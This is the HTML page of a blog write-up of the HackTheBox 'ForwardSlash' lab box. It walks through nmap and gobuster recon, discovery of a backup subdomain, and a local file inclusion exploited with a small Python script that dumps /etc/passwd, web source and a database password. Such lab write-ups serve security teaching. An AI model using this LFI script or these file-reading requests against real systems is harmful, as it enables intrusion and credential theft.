<!DOCTYPE html>
<html lang=en>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="ForwardSlash just retired on Hackthebox. It was a really cool box but full of rabbit holes. Rated hard difficulty it is a very “CTF-Like” box that could be very frustrating for some but also very fu">
<meta property="og:type" content="article">
<meta property="og:title" content="HackTheBox - ForwardSlash">
<meta property="og:url" content="https://hg8.sh/posts/forwardslash/index.html">
<meta property="og:site_name" content="hg8&#39;s Notes — My notes about infosec world. Pentest&#x2F;Bug Bounty&#x2F;CTF Writeups.">
<meta property="og:description" content="ForwardSlash just retired on Hackthebox. It was a really cool box but full of rabbit holes. Rated hard difficulty it is a very “CTF-Like” box that could be very frustrating for some but also very fu">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/82154121-1d149700-986c-11ea-8a38-5cf4aabb7eb2.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/79313932-5c646680-7f01-11ea-90d0-0bd591c571f0.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/79314103-9df51180-7f01-11ea-9bfb-093dbecbb193.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/79314354-e3b1da00-7f01-11ea-8af2-a2a4605f2b07.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/79314465-fe844e80-7f01-11ea-8893-deff73d490eb.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/79314537-12c84b80-7f02-11ea-9744-8e93f9db3703.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/79314626-368b9180-7f02-11ea-8d01-a3503bd96e5d.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/79314727-5cb13180-7f02-11ea-8465-903f31c33af2.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/79315755-af3f1d80-7f03-11ea-9c39-8601359c4adb.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/79315096-dcd79700-7f02-11ea-9011-58b96cb60f5d.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/79317113-95063f00-7f05-11ea-93a6-35e7aa075b47.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/79318255-05619000-7f07-11ea-878b-b9622c73f434.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/79318514-638e7300-7f07-11ea-8416-5cc19d0fd57e.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/79319415-938a4600-7f08-11ea-8837-2cbf36788311.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/79320436-2081cf00-7f0a-11ea-9657-0205f4dc583d.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/79325948-59be3d00-7f12-11ea-93d9-97fe5ed8d740.jpg">
<meta property="article:published_time" content="2020-07-03T22:00:00.000Z">
<meta property="article:modified_time" content="2022-08-04T08:37:52.828Z">
<meta property="article:author" content="hg8">
<meta property="article:tag" content="linux">
<meta property="article:tag" content="LFI">
<meta property="article:tag" content="forwardslash">
<meta property="article:tag" content="XML">
<meta property="article:tag" content="XXE">
<meta property="article:tag" content="php filter">
<meta property="article:tag" content="re">
<meta property="article:tag" content="crypto">
<meta property="article:tag" content="bruteforce">
<meta property="article:tag" content="luks">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://user-images.githubusercontent.com/9076747/82154121-1d149700-986c-11ea-8a38-5cf4aabb7eb2.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
     
    <title>HackTheBox - ForwardSlash :: hg8&#39;s Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups.</title>
    
<link rel="stylesheet" href="/css/style.css">

    
    
<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="hg8's Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups." type="application/atom+xml">
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/posts/pwnable/collision/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/posts/servmon/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
    </span>
    <br/>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#User-flag"><span class="toc-number">1.</span> <span class="toc-text">User flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon"><span class="toc-number">1.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ForwardSlash-Backup-Site"><span class="toc-number">1.2.</span> <span class="toc-text">ForwardSlash Backup Site</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Method-1-Profile-picture-Local-File-Inclusion"><span class="toc-number">1.3.</span> <span class="toc-text">Method 1: Profile picture Local File Inclusion</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Method-2-XXE-Local-File-Inclusion-on-dev-API"><span class="toc-number">1.4.</span> <span class="toc-text">Method 2: XXE Local File Inclusion on &#x2F;dev&#x2F; API</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pivot-chiv-gt-pain"><span class="toc-number">1.5.</span> <span class="toc-text">Pivot chiv -&gt; pain</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Root-flag"><span class="toc-number">2.</span> <span class="toc-text">Root flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon-1"><span class="toc-number">2.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Encryption-key-bruteforce"><span class="toc-number">2.2.</span> <span class="toc-text">Encryption key bruteforce</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Accessing-encrypted-LUKS-image"><span class="toc-number">2.3.</span> <span class="toc-text">Accessing encrypted LUKS image</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%80%9CUnintended%E2%80%9D-way-to-root"><span class="toc-number">3.</span> <span class="toc-text">“Unintended” way to root</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        <header id="header">
  <a href="/">
  
      <div id="logo" style="background-image: url(/images/logo.webp);"></div>
  
    <span class="logo__mark"></span>
    <span class="logo__text">./hg8.sh</span>
    <span class="logo__cursor"></span>
  </a>
  <div id="nav">
    <ul>
      <li class="icon">
        <a href="#"><i class="fas fa-bars fa-2x"></i></a>
      </li>
       
        <li><a href="/">Home</a></li>
       
        <li><a href="/about/">About</a></li>
       
        <li><a href="/archives/">Posts</a></li>
       
        <li><a href="/search/">Search</a></li>
      
    </ul>
  </div>
</header>

        
          <br>
          <br>
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        HackTheBox - ForwardSlash
    </h1>



    <div class="meta"> 
      
    <div class="postdate">
      
        <time datetime="2020-07-03T22:00:00.000Z" itemprop="datePublished">04-07-2020</time>
        
      
    </div>


      — Written by 
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">hg8</span>
      </span>
      —
      26 min read
    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <img width="578" alt="forwardslash-hackthebox" src="https://user-images.githubusercontent.com/9076747/82154121-1d149700-986c-11ea-8a38-5cf4aabb7eb2.png">

<p>ForwardSlash just retired on Hackthebox. It was a really cool box but full of rabbit holes. Rated hard difficulty it is a very “CTF-Like” box that could be very frustrating for some but also very fun for others. Globally I really enjoyed this box and learned a few tricks. The only drawbacks of this one is to require users to reset the box after getting the root flag since the root access greatly spoil other users. Unfortunately most users don’t clean up after them leaving the root access wide open and easy. </p>
<p><strong>Tl;Dr:</strong> The user flag consisted in accessing a backup website location, creating account on it as <code>admin</code>. From there you could exploit a Local File Inclusion (LFI) and XML External Entity Injection (XXE) vulnerability to extract php files containing credentials for <code>chiv</code> user. Next step was to pivot from <code>chiv</code> to <code>pain</code> user by reversing a <code>suid</code> home-made backup manager to display config file backup using a symbolic link.<br>The root flag could be accessed after decrypting a encrypted text file in <code>pain</code> home folder. Having access to the decryption function and using a weak algorithm it was possible to brute-force the key used to encrypt the text file that turn out to contains the password of an encrypted LUKS disk containing the <code>root</code> user SSH private key file.</p>
<p>The box had 2 ways to access to <code>chiv</code> user and an unintended way to access root flag that I will describe in this write-up.</p>
<p>Alright! Let’s get into the details now!</p>
<hr>
<p>First thing first, let’s add the box IP to the host file:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;10.10.10.183 forwardslash.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>

<p>and let’s start!</p>
<h2 id="User-flag"><a href="#User-flag" class="headerlink" title="User flag"></a>User flag</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>Let’s start with the classic <code>nmap</code> scan to see which ports are open on the box:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nmap -sV -sT -sC forwardslash.htb      </span><br><span class="line">Nmap scan report <span class="keyword">for</span> forwardslash.htb (10.10.10.183)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Backslash Gang</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 8.10 seconds</span><br></pre></td></tr></table></figure>

<p>We have the “classic”: A web app running on port 80 and the SSH port 22 open. </p>
<p>Opening <code>http://forwardslash.htb/</code> display the following website:</p>
<p><img src="https://user-images.githubusercontent.com/9076747/79313932-5c646680-7f01-11ea-90d0-0bd591c571f0.png" alt="Forwardslash homepage" title="Forwardslash homepage"></p>
<p>Another hacked website? </p>
<p>The message seems to gives us information about the website got compromised:</p>
<blockquote>
<p>This was ridiculous, who even uses XML and Automatic FTP Logins</p>
</blockquote>
<p>Let’s keep that in mind for later.</p>
<p>Let’s now run <code>gobuster</code> to see if he can find some juicy files and folders:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ gobuster dir -u <span class="string">&quot;http://forwardslash.htb/&quot;</span> -w ~/SecLists/Discovery/Web-Content/big.txt -x php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">/.htpasswd (Status: 403)</span><br><span class="line">/.htpasswd.php (Status: 403)</span><br><span class="line">/.htaccess (Status: 403)</span><br><span class="line">/.htaccess.php (Status: 403)</span><br><span class="line">/index.php (Status: 200)</span><br><span class="line">/server-status (Status: 403)</span><br></pre></td></tr></table></figure>

<p>Nothing? That’s odd… Let’s try with different file extension. First with <code>.xml</code> since it’s stated in the hacker message. Still no results… </p>
<p>Trying other common extensions until….</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ gobuster dir -u <span class="string">&quot;http://forwardslash.htb/&quot;</span> -w ~/SecLists/Discovery/Web-Content/big.txt -x txt</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">/.htaccess (Status: 403)</span><br><span class="line">/.htaccess.txt (Status: 403)</span><br><span class="line">/.htpasswd (Status: 403)</span><br><span class="line">/.htpasswd.txt (Status: 403)</span><br><span class="line">/note.txt (Status: 200)</span><br><span class="line">/server-status (Status: 403)</span><br></pre></td></tr></table></figure>

<p><code>note.txt</code> that’s not much but it’s a start!</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl http://forwardslash.htb/note.txt</span><br><span class="line">Pain, we were hacked by some skids that call themselves the <span class="string">&quot;Backslash Gang&quot;</span>... I know... That name...</span><br><span class="line">Anyway I am just leaving this note here to say that we still have that backup site so we should be fine.</span><br><span class="line"></span><br><span class="line">-chiv</span><br></pre></td></tr></table></figure>

<p>It’s a note from one of the website developer. The interesting part is him saying <code>we still have that backup site</code>. Since <code>gobuster</code> didn’t discover any other subdirectories and <code>nmap</code> no other open ports, what remains ? Subdomain probably.</p>
<p>To give a try let’s add <code>backup.forwardslash.htb</code> to our host file:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;10.10.10.183 backup.forwardslash.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>

<p>And bingo, opening <code>http://backup.forwardslash.htb/</code> display a login form:</p>
<p><img src="https://user-images.githubusercontent.com/9076747/79314103-9df51180-7f01-11ea-9bfb-093dbecbb193.png" alt="backup forwardslash login" title="backup forwardslash login"></p>
<h3 id="ForwardSlash-Backup-Site"><a href="#ForwardSlash-Backup-Site" class="headerlink" title="ForwardSlash Backup Site"></a>ForwardSlash Backup Site</h3><p>First thing I always try when stumbling upon Login form is trying to login with the credentials <code>admin:admin</code>. This time it doesn’t work but an error message is returned:</p>
<blockquote>
<p>No account found with that username “admin”.</p>
</blockquote>
<p>Might be interesting to keep in mind for later. </p>
<p>Since there is a register form let’s create an account and connect to this backup platform. </p>
<p><img src="https://user-images.githubusercontent.com/9076747/79314354-e3b1da00-7f01-11ea-8af2-a2a4605f2b07.png" alt="welcome page backup forwardslash" title="welcome page backup forwardslash"></p>
<p>We arrive to a dashboard with different options for editing our current accounts and two informations pages. </p>
<p>Let’s focus on the “Change profile picture” page. Profile picture upload page are often a good way to upload a web shell to a server.</p>
<h3 id="Method-1-Profile-picture-Local-File-Inclusion"><a href="#Method-1-Profile-picture-Local-File-Inclusion" class="headerlink" title="Method 1: Profile picture Local File Inclusion"></a>Method 1: Profile picture Local File Inclusion</h3><p>Once opening the page we get another message from the <code>pain</code> user:</p>
<p><img src="https://user-images.githubusercontent.com/9076747/79314465-fe844e80-7f01-11ea-8893-deff73d490eb.png" alt="change picture forwardslash" title="change picture forwardslash"></p>
<p>While inspecting the source code we can indeed see that both text file and submit button have been set to <code>disabled</code>. </p>
<p><img src="https://user-images.githubusercontent.com/9076747/79314537-12c84b80-7f02-11ea-9744-8e93f9db3703.png" alt="remove disabled forwardslash"></p>
<p>From the first look it seems like simply removing the <code>disabled</code> attribute will allow us to use the form. </p>
<p>Since the form takes an URL as input, let’s open a python web server on our machine to see if the form is making call to the given url:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br></pre></td></tr></table></figure>

<p><img src="https://user-images.githubusercontent.com/9076747/79314626-368b9180-7f02-11ea-8d01-a3503bd96e5d.png" alt="form call forwardslash"></p>
<p>And indeed when validating the form a new request appear on our web server confirming that the “Photo Update” function is still running and only the HTML form got disabled:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br><span class="line">10.10.10.183 - - [08/Apr/2020 20:38:25] <span class="string">&quot;GET / HTTP/1.0&quot;</span> 200 -</span><br></pre></td></tr></table></figure>

<p>But something more interesting appear on the page:</p>
<p> <img src="https://user-images.githubusercontent.com/9076747/79314727-5cb13180-7f02-11ea-8465-903f31c33af2.png" alt="return page forwardslash"></p>
<p>The web server return message gets displayed below the form. </p>
<p>Something else come to my mind. Seeing the box name <code>ForwardSlash</code> can we use this form to achieve Local File Inclusion ? Let’s see if we can access the <code>index.php</code> file from here.</p>
<blockquote>
<p>Permission Denied; not that way ;)</p>
</blockquote>
<p>Seems like we are almost on the right track… Let’s try the classical <code>/etc/passwd</code> to validate -or not- the LFI theory:</p>
<p><img src="https://user-images.githubusercontent.com/9076747/79315755-af3f1d80-7f03-11ea-9c39-8601359c4adb.png" alt="etc passwd forwardslash"></p>
<p>Bingo! We can see two users on the box: <code>chiv</code> and <code>pain</code>. The same two developers we have seen leaving messages around. Let’s keep that in mind for later.</p>
<p>Now let’s try to access other useful files using this LFI. From here I decided to write a small script to ease the LFI process. As much as possible it’s always good to write your own script to make sure you understand every steps you are doing.</p>
<p>This script is clearly not the prettiest one nor that most performant to it do the job well enough:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">PHPSESSID = <span class="string">&quot;xxxxxxxxxxxxxxxxxxxxx&quot;</span></span><br><span class="line"></span><br><span class="line">cookies = &#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: PHPSESSID&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    file_path = <span class="built_in">input</span>(<span class="string">&#x27;File path &gt; &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    payload = &#123;<span class="string">&#x27;url&#x27;</span>: file_path&#125;</span><br><span class="line">    </span><br><span class="line">    r = requests.post(<span class="string">&quot;http://backup.forwardslash.htb/profilepicture.php&quot;</span>,</span><br><span class="line">                      cookies=cookies,</span><br><span class="line">                      data=payload)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(r.content) != <span class="number">689</span>:  <span class="comment"># 689 is the size or &quot;normal&quot; response</span></span><br><span class="line">        file_only = re.sub(<span class="string">&#x27;&lt;!(.*?)/html&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, r.text, <span class="number">1</span>, re.DOTALL)</span><br><span class="line">        <span class="built_in">print</span>(file_only)</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Permission Denied / File does not exist&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>Let’s give it a try:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python lfi-blog.py</span><br><span class="line">File path &gt; /etc/passwd</span><br><span class="line"></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin</span><br><span class="line">syslog:x:102:106::/home/syslog:/usr/sbin/nologin</span><br><span class="line">messagebus:x:103:107::/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:104:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">lxd:x:105:65534::/var/lib/lxd/:/bin/<span class="literal">false</span></span><br><span class="line">uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin</span><br><span class="line">dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin</span><br><span class="line">landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin</span><br><span class="line">pollinate:x:109:1::/var/cache/pollinate:/bin/<span class="literal">false</span></span><br><span class="line">sshd:x:110:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">pain:x:1000:1000:pain:/home/pain:/bin/bash</span><br><span class="line">chiv:x:1001:1001:Chivato,,,:/home/chiv:/bin/bash</span><br><span class="line">mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/<span class="literal">false</span></span><br><span class="line"></span><br><span class="line">File path &gt;</span><br></pre></td></tr></table></figure>

<p>Faster and easier to read right ?</p>
<p>Using this let’s try to access as much file as we can, first let’s try the usual sensitive SSH keys:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python lfi-blog.py</span><br><span class="line">File path &gt; /home/chiv/.ssh/id_rsa</span><br><span class="line">Permission Denied / File does not exist</span><br><span class="line">File path &gt; /home/pain/.ssh/id_rsa</span><br><span class="line">Permission Denied / File does not exist</span><br><span class="line">File path &gt;</span><br></pre></td></tr></table></figure>

<p>It would have been too easy right of course. Maybe if we can find the web app path we can access the app source code with sensitive informations.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python lfi-blog.py</span><br><span class="line">File path &gt; config.php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">//credentials <span class="keyword">for</span> the temp db <span class="keyword">while</span> we recover, had to backup old config, didn<span class="string">&#x27;t want it getting compromised -pain</span></span><br><span class="line"><span class="string">define(&#x27;</span>DB_SERVER<span class="string">&#x27;, &#x27;</span>localhost<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">define(&#x27;</span>DB_USERNAME<span class="string">&#x27;, &#x27;</span>www-data<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">define(&#x27;</span>DB_PASSWORD<span class="string">&#x27;, &#x27;</span>5iIwJX0C2nZiIhkLYE7n314VcKNx8uMkxfLvCTz2USGY180ocz3FQuVtdCy3dAgIMK3Y8XFZv9fBi6OwG6OYxoAVnhaQkm7r2ec<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">define(&#x27;</span>DB_NAME<span class="string">&#x27;, &#x27;</span>site<span class="string">&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/* Attempt to connect to MySQL database */</span></span><br><span class="line"><span class="string">$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// Check connection</span></span><br><span class="line"><span class="string">if($link === false)&#123;</span></span><br><span class="line"><span class="string">    die(&quot;ERROR: Could not connect. &quot; . mysqli_connect_error());</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>Here we have the credentials of the <code>temp</code> database, this won’t be very useful. Since we know the server is Apache let’s see if the web app is stored in the default Apache folder:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ python lfi-blog.py</span><br><span class="line">File path &gt; /var/www/html/index.php</span><br><span class="line">&lt;?php</span><br><span class="line">//<span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_NAME&#x27;</span>] !== <span class="string">&quot;forwardslash.htb&quot;</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_NAME&#x27;</span>] !== <span class="string">&quot;forwardslash.htb&quot;</span>) &#123;</span><br><span class="line">        header(<span class="string">&quot;Location: http://forwardslash.htb&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line">You call this security? &lt;font color=<span class="string">&quot;red&quot;</span>&gt;LOL&lt;/font&gt;, absolute trash server...   |</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>

